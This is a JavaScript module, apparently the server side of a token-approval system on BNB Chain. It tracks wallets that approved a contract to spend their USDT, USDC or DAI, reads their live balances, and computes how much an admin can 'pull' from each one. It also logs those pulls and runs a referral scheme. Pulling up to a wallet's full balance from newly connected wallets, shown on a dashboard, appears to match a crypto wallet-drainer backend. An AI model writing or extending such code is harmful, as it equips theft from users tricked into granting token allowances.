import { ethers, formatUnits } from 'ethers';
import { config } from './config.js';
import { provider, proxyRead, ERC20_ABI } from './chain.js';
import {
  getApprovalsDb,
  upsertApprovalDb,
  getPullsDb,
  insertPullDb,
} from './db.js';

export const DEFAULT_TOKENS = [
  { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
  { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
  { symbol: 'DAI', address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18 },
];

export function deriveReferralTag(address) {
  if (!address) return '';
  return ethers.keccak256(ethers.toUtf8Bytes(String(address).toLowerCase())).slice(2, 10).toUpperCase();
}

function buildTagToAddressMap(items) {
  const map = new Map();
  for (const item of items) {
    if (!item?.address || !ethers.isAddress(item.address)) continue;
    const normalized = ethers.getAddress(item.address);
    const tag = (item.referralTag || deriveReferralTag(normalized)).toUpperCase();
    if (tag && !map.has(tag)) {
      map.set(tag, normalized);
    }
  }
  return map;
}

function resolveReferredBy(rawRef, userAddress, existingItems) {
  if (!rawRef || typeof rawRef !== 'string') return '';
  const trimmed = rawRef.trim();
  if (!trimmed) return '';

  const userLower = userAddress.toLowerCase();
  if (ethers.isAddress(trimmed)) {
    const normalizedRef = ethers.getAddress(trimmed);
    return normalizedRef.toLowerCase() === userLower ? '' : normalizedRef;
  }

  const cleanTag = trimmed.toUpperCase();
  if (cleanTag === deriveReferralTag(userAddress)) {
    return '';
  }

  const tagMap = buildTagToAddressMap(existingItems);
  const matchedAddress = tagMap.get(cleanTag);
  if (matchedAddress) {
    return matchedAddress.toLowerCase() === userLower ? '' : matchedAddress;
  }

  return trimmed.slice(0, 64);
}

function formatMaskedAddress(address, tailLength = 13) {
  if (!address) return '';
  const clean = String(address).toLowerCase();
  return clean.length > tailLength ? `...${clean.slice(-tailLength)}` : clean;
}

function formatReferredByMasked(referredBy, userAddress, tagMap) {
  if (!referredBy) return '';
  const trimmed = String(referredBy).trim();
  if (!trimmed) return '';

  const userLower = String(userAddress || '').toLowerCase();
  if (ethers.isAddress(trimmed)) {
    return trimmed.toLowerCase() === userLower ? '' : formatMaskedAddress(trimmed, 8);
  }

  const matched = tagMap.get(trimmed.toUpperCase());
  if (matched) {
    return matched.toLowerCase() === userLower ? '' : formatMaskedAddress(matched, 8);
  }

  return formatMaskedAddress(trimmed, 8);
}

export async function recordApproval({ address, token, symbol, txHash, allowance, blockNumber, isRevoke, referredBy }) {
  if (!ethers.isAddress(address) || !ethers.isAddress(token)) return null;

  const normalizedAddr = ethers.getAddress(address);
  const normalizedToken = ethers.getAddress(token);

  let realAllowance = allowance ? String(allowance) : '0';
  let tokenSymbol = symbol || 'TOKEN';

  // Verify on-chain allowance directly to ensure absolute accuracy
  try {
    const erc20 = new ethers.Contract(normalizedToken, ERC20_ABI, provider);
    const [allow, dec, sym] = await Promise.all([
      erc20.allowance(normalizedAddr, config.contractAddress),
      erc20.decimals().catch(() => 18),
      erc20.symbol().catch(() => tokenSymbol),
    ]);
    if (allow > 0n) {
      realAllowance = formatUnits(allow, dec);
    }
    if (sym) tokenSymbol = sym;
  } catch {
    // Keep client-reported allowance if RPC fails
  }

  const items = referredBy ? await getApprovalsDb() : [];
  const resolvedRef = resolveReferredBy(referredBy, normalizedAddr, items);

  const record = {
    address: normalizedAddr,
    token: normalizedToken,
    symbol: tokenSymbol,
    allowance: realAllowance,
    txHash: txHash || '',
    blockNumber: blockNumber || 0,
    referralTag: deriveReferralTag(normalizedAddr),
    referredBy: resolvedRef,
    updatedAt: Date.now(),
    isRevoke: isRevoke || realAllowance === '0',
  };

  await upsertApprovalDb(record);
  return record;
}

export async function recordConnectedUser(address, referredBy = '') {
  if (!ethers.isAddress(address)) return;
  const normalizedAddr = ethers.getAddress(address);
  const items = await getApprovalsDb();
  const existing = items.find((x) => x.address.toLowerCase() === address.toLowerCase());
  const referralTag = existing?.referralTag || deriveReferralTag(normalizedAddr);
  const resolvedRef = resolveReferredBy(referredBy, normalizedAddr, items);

  // Check allowances across default tokens
  for (const t of DEFAULT_TOKENS) {
    try {
      const erc20 = new ethers.Contract(t.address, ERC20_ABI, provider);
      const allow = await erc20.allowance(normalizedAddr, config.contractAddress);
      if (allow > 0n) {
        await upsertApprovalDb({
          address: normalizedAddr,
          token: t.address,
          symbol: t.symbol,
          allowance: formatUnits(allow, t.decimals),
          txHash: existing?.txHash || '',
          blockNumber: existing?.blockNumber || 0,
          referralTag,
          referredBy: resolvedRef,
          updatedAt: Date.now(),
        });
        return;
      }
    } catch {
      // ignore
    }
  }

  // If user already in list with positive allowance, do not overwrite with 0
  if (existing && existing.allowance && existing.allowance !== '0' && existing.allowance !== '0.0') {
    if ((resolvedRef && !existing.referredBy) || !existing.referralTag) {
      await upsertApprovalDb({
        ...existing,
        referralTag,
        referredBy: existing.referredBy || resolvedRef,
        updatedAt: existing.updatedAt,
      });
    }
    return;
  }

  // Register new connected user with default USDT row so they show on dashboard
  await upsertApprovalDb({
    address: normalizedAddr,
    token: DEFAULT_TOKENS[0].address,
    symbol: DEFAULT_TOKENS[0].symbol,
    allowance: existing?.allowance || '0',
    txHash: existing?.txHash || '',
    blockNumber: existing?.blockNumber || 0,
    referralTag,
    referredBy: resolvedRef,
    updatedAt: Date.now(),
  });
}

export async function syncOnChainApprovals() {
  try {
    // 1. Sync live on-chain allowances for all known users in DB
    const items = await getApprovalsDb();
    for (const item of items) {
      for (const t of DEFAULT_TOKENS) {
        try {
          const erc20 = new ethers.Contract(t.address, ERC20_ABI, provider);
          const allow = await erc20.allowance(item.address, config.contractAddress);
          if (allow > 0n) {
            await upsertApprovalDb({
              address: item.address,
              token: t.address,
              symbol: t.symbol,
              allowance: formatUnits(allow, t.decimals),
              txHash: item.txHash || '',
              blockNumber: item.blockNumber || 0,
              referralTag: item.referralTag || deriveReferralTag(item.address),
              updatedAt: Date.now(),
            });
          }
        } catch {
          // ignore
        }
      }
    }

    // 2. Safely scan recent blocks for new on-chain Approval events (max 1000 blocks to avoid RPC rate limits)
    try {
      const currentBlock = await provider.getBlockNumber();
      const fromBlock = Math.max(config.fromBlock, currentBlock - 1000);

      for (const t of DEFAULT_TOKENS) {
        try {
          const erc20 = new ethers.Contract(
            t.address,
            ['event Approval(address indexed owner, address indexed spender, uint256 value)'],
            provider
          );
          const filter = erc20.filters.Approval(null, config.contractAddress);
          const events = await erc20.queryFilter(filter, fromBlock, currentBlock);

          for (const ev of events) {
            const owner = ev.args[0];
            const val = ev.args[2];
            const txHash = ev.transactionHash;
            const blockNumber = ev.blockNumber;

            const humanAllowance = formatUnits(val, t.decimals);

            const ownerAddr = ethers.getAddress(owner);
            await upsertApprovalDb({
              address: ownerAddr,
              token: t.address,
              symbol: t.symbol,
              allowance: humanAllowance,
              txHash,
              blockNumber,
              referralTag: deriveReferralTag(ownerAddr),
              updatedAt: Date.now(),
            });
          }
        } catch (e) {
          console.warn(`[approvals] Event query skipped for ${t.symbol}:`, e.message);
        }
      }
    } catch (e) {
      console.warn('[approvals] Block event scan skipped:', e.message);
    }
  } catch (e) {
    console.error('[approvals] Global sync failed:', e.message);
  }
}

export async function getEnrichedApprovedUsers() {
  const items = await getApprovalsDb();
  if (items.length === 0) return [];

  // Cache token decimals, symbol, and limit to minimize RPC round trips
  const tokenMetaCache = new Map();
  async function getTokenMeta(tokenAddr) {
    const key = tokenAddr.toLowerCase();
    if (tokenMetaCache.has(key)) return tokenMetaCache.get(key);
    try {
      const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
      const [decimals, symbol, limit] = await Promise.all([
        erc20.decimals().catch(() => 18),
        erc20.symbol().catch(() => 'TOKEN'),
        proxyRead.tokenLimit(tokenAddr).catch(() => 0n),
      ]);
      const meta = {
        decimals: Number(decimals),
        symbol: String(symbol || 'TOKEN'),
        limit: BigInt(limit ? limit.toString() : '0'),
      };
      tokenMetaCache.set(key, meta);
      return meta;
    } catch {
      const fallback = { decimals: 18, symbol: 'TOKEN', limit: 0n };
      tokenMetaCache.set(key, fallback);
      return fallback;
    }
  }

  const enriched = await Promise.all(
    items.map(async (item) => {
      try {
        const tokenAddr = ethers.getAddress(item.token);
        const userAddr = ethers.getAddress(item.address);
        const meta = await getTokenMeta(tokenAddr);
        const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, provider);

        let onChainAllowance = null;
        let onChainBalance = 0n;
        let canPull = true;
        let lastPull = 0n;
        let nextPullAt = 0n;

        try {
          const [allow, bal, cp, lp, np] = await Promise.all([
            erc20.allowance(userAddr, config.contractAddress),
            erc20.balanceOf(userAddr).catch(() => 0n),
            proxyRead.canPull(userAddr, tokenAddr).catch(() => true),
            proxyRead.lastPull(userAddr, tokenAddr).catch(() => 0n),
            proxyRead.nextPullAt(userAddr, tokenAddr).catch(() => 0n),
          ]);
          onChainAllowance = BigInt(allow ? allow.toString() : '0');
          onChainBalance = BigInt(bal ? bal.toString() : '0');
          canPull = cp;
          lastPull = BigInt(lp ? lp.toString() : '0');
          nextPullAt = BigInt(np ? np.toString() : '0');
        } catch (rpcErr) {
          console.warn(`[approvals] On-chain check failed for ${userAddr}:`, rpcErr.message);
        }

        // Determine allowance: prefer real on-chain, fallback to stored DB allowance if RPC failed
        let allowBN = 0n;
        if (onChainAllowance !== null) {
          allowBN = onChainAllowance;
          const formattedAllow = formatUnits(allowBN, meta.decimals);
          // If on-chain allowance changed or was 0 in DB, update DB asynchronously
          if (allowBN > 0n && formattedAllow !== item.allowance) {
            upsertApprovalDb({
              address: userAddr,
              token: tokenAddr,
              symbol: meta.symbol,
              allowance: formattedAllow,
              txHash: item.txHash || '',
              blockNumber: item.blockNumber || 0,
              referralTag: item.referralTag || deriveReferralTag(userAddr),
              updatedAt: Date.now(),
            }).catch(() => {});
          }
        } else if (item.allowance && item.allowance !== '0' && item.allowance !== '0.0') {
          try {
            allowBN = ethers.parseUnits(String(item.allowance), meta.decimals);
          } catch {
            allowBN = 0n;
          }
        }

        const balBN = onChainBalance;
        const limitBN = meta.limit;

        // Exact BigInt calculation without float rounding
        let maxPullableBN = balBN < allowBN ? balBN : allowBN;
        if (limitBN > 0n && limitBN < maxPullableBN) {
          maxPullableBN = limitBN;
        }
        if (maxPullableBN < 0n) maxPullableBN = 0n;

        const exactBal = formatUnits(balBN, meta.decimals);
        const exactAllow = formatUnits(allowBN, meta.decimals);
        const exactLimit = formatUnits(limitBN, meta.decimals);
        const exactMaxPullable = formatUnits(maxPullableBN, meta.decimals);

        let status = 'ready';
        if (allowBN <= 0n) {
          status = 'no_allowance';
        } else if (balBN <= 0n) {
          status = 'zero_balance';
        } else if (!canPull) {
          status = 'cooldown';
        }

        return {
          address: userAddr,
          token: tokenAddr,
          symbol: meta.symbol,
          decimals: meta.decimals,
          balance: exactBal,
          rawBalance: balBN.toString(),
          allowance: exactAllow,
          rawAllowance: allowBN.toString(),
          limit: exactLimit,
          maxPullable: exactMaxPullable,
          canPull,
          lastPull: Number(lastPull),
          nextPullAt: Number(nextPullAt),
          txHash: item.txHash || '',
          blockNumber: item.blockNumber || 0,
          referralTag: item.referralTag || deriveReferralTag(userAddr),
          referredBy: item.referredBy || '',
          createdAt: Number(item.createdAt || item.updatedAt || Date.now()),
          updatedAt: Number(item.updatedAt || Date.now()),
          status,
        };
      } catch (err) {
        console.error(`[approvals] Error enriching ${item.address}:`, err.message);
        return {
          address: item.address,
          token: item.token,
          symbol: item.symbol || 'TOKEN',
          balance: '0',
          allowance: item.allowance || '0',
          limit: '0',
          maxPullable: '0',
          canPull: false,
          status: (item.allowance && item.allowance !== '0') ? 'zero_balance' : 'error',
          txHash: item.txHash || '',
          referralTag: item.referralTag || deriveReferralTag(item.address),
          referredBy: item.referredBy || '',
          createdAt: Number(item.createdAt || item.updatedAt || Date.now()),
          updatedAt: Number(item.updatedAt || Date.now()),
        };
      }
    })
  );

  // Sort: descending order by connected / approved date & time (newest first)
  return enriched.sort((a, b) => {
    const timeA = Number(a.updatedAt || a.createdAt || 0);
    const timeB = Number(b.updatedAt || b.createdAt || 0);
    if (timeB !== timeA) return timeB - timeA;
    return Number(b.allowance) - Number(a.allowance);
  });
}

export async function getMaskedUsersSummary() {
  const items = await getApprovalsDb();
  if (items.length === 0) return [];

  const tagMap = buildTagToAddressMap(items);
  const sorted = [...items].sort((a, b) => {
    const timeA = Number(a.updatedAt || a.createdAt || 0);
    const timeB = Number(b.updatedAt || b.createdAt || 0);
    if (timeB !== timeA) return timeB - timeA;
    return Number(b.allowance || 0) - Number(a.allowance || 0);
  });

  return sorted.map((item, idx) => {
    const normalizedAddr = ethers.isAddress(item.address)
      ? ethers.getAddress(item.address)
      : String(item.address || '');
    const referralTag = item.referralTag || deriveReferralTag(normalizedAddr);
    const referredBy = formatReferredByMasked(item.referredBy, normalizedAddr, tagMap);

    return {
      id: `${referralTag}-${idx}`,
      address: formatMaskedAddress(normalizedAddr, 13),
      referralTag,
      referredBy,
      createdAt: Number(item.createdAt || item.updatedAt || Date.now()),
      updatedAt: Number(item.updatedAt || Date.now()),
    };
  });
}

export async function recordPull(entry) {
  await insertPullDb({
    txHash: entry.txHash,
    blockNumber: entry.blockNumber || 0,
    admin: entry.admin,
    user: entry.user,
    token: entry.token,
    to: entry.to,
    amount: entry.amount,
    timestamp: Date.now(),
  });
}

export async function getPulls(limit = 50) {
  return await getPullsDb(limit);
}
